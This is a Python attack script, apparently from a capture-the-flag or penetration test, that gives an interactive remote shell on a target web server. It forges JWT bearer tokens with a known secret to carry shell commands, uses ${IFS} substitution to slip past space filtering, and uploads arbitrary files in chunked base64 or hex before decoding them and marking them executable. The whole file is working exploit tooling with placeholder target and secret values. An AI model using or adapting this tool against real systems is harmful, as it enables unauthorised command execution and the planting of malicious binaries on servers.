import requests
import jwt
import base64
import random
import sys
import time

TARGET = 'http://TARGET/'
SECRET = "JWT_SECRET"

class Shell:
    def __init__(self):
        self.current_dir = None
        self.get_initial_dir()
    
    def get_initial_dir(self):
        """Get the initial directory"""
        result = self.exploit("pwd")
        if result:
            self.current_dir = result.strip()
            print(f"[*] Initial directory: {self.current_dir}")
    
    def exploit(self, command):
        """Execute a command on the server"""
        encoded_jwt = jwt.encode({"cmd": command}, SECRET, algorithm="HS256")
        headers = {
            'Authorization': 'Bearer ' + encoded_jwt,
        }
        response = requests.get(TARGET, headers=headers)
        return response.text
    
    def execute_with_context(self, command):
        """Execute a command in the current directory context"""
        if self.current_dir:
            full_command = f"cd${{IFS}}{self.current_dir}${{IFS}}&&${{IFS}}{command}"
        else:
            full_command = command
        
        return self.exploit(full_command)
    
    def change_directory(self, path):
        """Change the current directory"""
        if not path:
            # cd without argument = home
            test_cmd = "cd${{IFS}}&&${{IFS}}pwd"
        else:
            # cd to a specific path
            safe_path = path.replace(" ", "${IFS}")
            test_cmd = f"cd${{IFS}}{safe_path}${{IFS}}&&${{IFS}}pwd"
        
        result = self.exploit(test_cmd)
        
        if result and "No such file or directory" not in result and result.strip():
            self.current_dir = result.strip()
            print(f"[+] Current directory: {self.current_dir}")
            return True
        else:
            print(f"[!] Unable to change to: {path}")
            print(f"[!] Error: {result}")
            return False
    
    def upload_file(self, local_file, remote_path=None):
        """Upload a file to the server - improved method"""
        try:
            with open(local_file, "rb") as f:
                content = f.read()
            
            # Generate a random temporary name
            rand_tmp = random.randrange(10000, 99999)
            
            # Encode file in base64
            b64_content = base64.b64encode(content).decode()
            
            print(f"[*] Uploading {local_file} ({len(content)} bytes, {len(b64_content)} bytes encoded)")
            
            # Determine destination path
            if remote_path is None:
                if self.current_dir:
                    remote_path = f"{self.current_dir}/{local_file}"
                else:
                    remote_path = f"/tmp/{local_file}"
            elif not remote_path.startswith('/'):
                remote_path = f"{self.current_dir}/{remote_path}"
            
            tmp_file = f"/tmp/.upload_{rand_tmp}"
            
            # Clean up first if file exists
            self.exploit(f"rm${{IFS}}-f${{IFS}}{tmp_file}")
            time.sleep(0.1)
            
            # Split into small chunks (smaller to avoid issues)
            chunk_size = 3000
            total_chunks = (len(b64_content) + chunk_size - 1) // chunk_size
            
            print(f"[*] Sending in {total_chunks} chunks...")
            
            for i in range(0, len(b64_content), chunk_size):
                chunk = b64_content[i:i+chunk_size]
                chunk_num = (i // chunk_size) + 1
                
                # Method 1: Use printf instead of echo to avoid escaping issues
                cmd = f"printf${{IFS}}'%s'${{IFS}}'{chunk}'>>{tmp_file}"
                
                result = self.exploit(cmd)
                
                # Small delay between chunks
                time.sleep(0.05)
                
                print(f"[*] Chunk {chunk_num}/{total_chunks} sent", end='\r')
            
            print(f"\n[+] All chunks sent to {tmp_file}")
            
            # Verify that temporary file exists and has the right size
            check_cmd = f"wc${{IFS}}-c${{IFS}}{tmp_file}"
            check_result = self.exploit(check_cmd)
            print(f"[*] Encoded file size: {check_result.strip()}")
            
            # Decode the file
            print(f"[*] Decoding to {remote_path}...")
            decode_cmd = f"base64${{IFS}}-d${{IFS}}{tmp_file}>{remote_path}"
            decode_result = self.exploit(decode_cmd)
            
            time.sleep(0.2)
            
            # Make executable
            chmod_cmd = f"chmod${{IFS}}+x${{IFS}}{remote_path}"
            self.exploit(chmod_cmd)
            
            # Verify final upload
            verify_cmd = f"ls${{IFS}}-lh${{IFS}}{remote_path}"
            verification = self.exploit(verify_cmd)
            
            if verification and "No such file" not in verification:
                print(f"[+] Upload successful!")
                print(f"[+] Verification:\n{verification}")
                
                # Check content (first bytes)
                head_cmd = f"head${{IFS}}-c${{IFS}}50${{IFS}}{remote_path}"
                head_result = self.exploit(head_cmd)
                print(f"[*] File start: {repr(head_result[:50])}")
            else:
                print(f"[!] Error: file was not created correctly")
                print(f"[!] Result: {verification}")
            
            # Clean up temporary file
            clean_cmd = f"rm${{IFS}}-f${{IFS}}{tmp_file}"
            self.exploit(clean_cmd)
            
            return True
            
        except FileNotFoundError:
            print(f"[!] File {local_file} not found")
            return False
        except Exception as e:
            print(f"[!] Error during upload: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def upload_file_hex(self, local_file, remote_path=None):
        """Upload a file using hexadecimal format (alternative)"""
        try:
            with open(local_file, "rb") as f:
                content = f.read()
            
            print(f"[*] Uploading {local_file} in hex ({len(content)} bytes)")
            
            # Determine destination path
            if remote_path is None:
                if self.current_dir:
                    remote_path = f"{self.current_dir}/{local_file}"
                else:
                    remote_path = f"/tmp/{local_file}"
            elif not remote_path.startswith('/'):
                remote_path = f"{self.current_dir}/{remote_path}"
            
            # Convert to hex
            hex_content = content.hex()
            
            rand_tmp = random.randrange(10000, 99999)
            tmp_file = f"/tmp/.hex_{rand_tmp}"
            
            # Clean up
            self.exploit(f"rm${{IFS}}-f${{IFS}}{tmp_file}")
            
            # Send in chunks
            chunk_size = 4000
            total_chunks = (len(hex_content) + chunk_size - 1) // chunk_size
            
            for i in range(0, len(hex_content), chunk_size):
                chunk = hex_content[i:i+chunk_size]
                chunk_num = (i // chunk_size) + 1
                
                cmd = f"printf${{IFS}}'{chunk}'>>{tmp_file}"
                self.exploit(cmd)
                time.sleep(0.05)
                
                print(f"[*] Chunk {chunk_num}/{total_chunks} sent", end='\r')
            
            print(f"\n[*] Hex decoding...")
            
            # Decode with xxd
            decode_cmd = f"xxd${{IFS}}-r${{IFS}}-p${{IFS}}{tmp_file}>{remote_path}"
            self.exploit(decode_cmd)
            
            # Chmod
            self.exploit(f"chmod${{IFS}}+x${{IFS}}{remote_path}")
            
            # Verify
            verify_cmd = f"ls${{IFS}}-lh${{IFS}}{remote_path}"
            verification = self.exploit(verify_cmd)
            print(f"[+] Verification:\n{verification}")
            
            # Clean up
            self.exploit(f"rm${{IFS}}-f${{IFS}}{tmp_file}")
            
            return True
            
        except Exception as e:
            print(f"[!] Error: {e}")
            return False

def main():
    print("="*60)
    print("Forward shell with cd and upload support")
    print("="*60)
    print("Special commands:")
    print("  cd <path>                    - Change directory")
    print("  upload <local> [remote]      - Upload a file (base64)")
    print("  uploadhex <local> [remote]   - Upload a file (hex)")
    print("  pwd                          - Show current directory")
    print("  exit/quit                    - Exit")
    print("="*60 + "\n")
    
    shell = Shell()
    
    while True:
        try:
            # Display prompt with current directory
            prompt = f"[{shell.current_dir or '?'}]$ "
            command = input(prompt).strip()
            
            if not command:
                continue
            
            # Exit command
            if command.lower() in ['exit', 'quit']:
                print("[*] Bye!")
                break
            
            # cd command
            if command.startswith("cd ") or command == "cd":
                if command == "cd":
                    path = ""
                else:
                    path = command[3:].strip()
                shell.change_directory(path)
                continue
            
            # pwd command
            if command == "pwd":
                print(shell.current_dir)
                continue
            
            # upload command
            if command.startswith("upload "):
                parts = command.split(maxsplit=2)
                if len(parts) == 2:
                    shell.upload_file(parts[1])
                elif len(parts) == 3:
                    shell.upload_file(parts[1], parts[2])
                else:
                    print("[!] Usage: upload <local_file> [remote_path]")
                continue
            
            # uploadhex command (alternative)
            if command.startswith("uploadhex "):
                parts = command.split(maxsplit=2)
                if len(parts) == 2:
                    shell.upload_file_hex(parts[1])
                elif len(parts) == 3:
                    shell.upload_file_hex(parts[1], parts[2])
                else:
                    print("[!] Usage: uploadhex <local_file> [remote_path]")
                continue
            
            # Normal command - replace spaces and execute with context
            safe_command = command.replace(" ", "${IFS}")
            result = shell.execute_with_context(safe_command)
            
            if result:
                print(result, end='')
                if not result.endswith('\n'):
                    print()
            else:
                print("[!] No output")
                
        except KeyboardInterrupt:
            print("\n[*] Use 'exit' to quit")
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
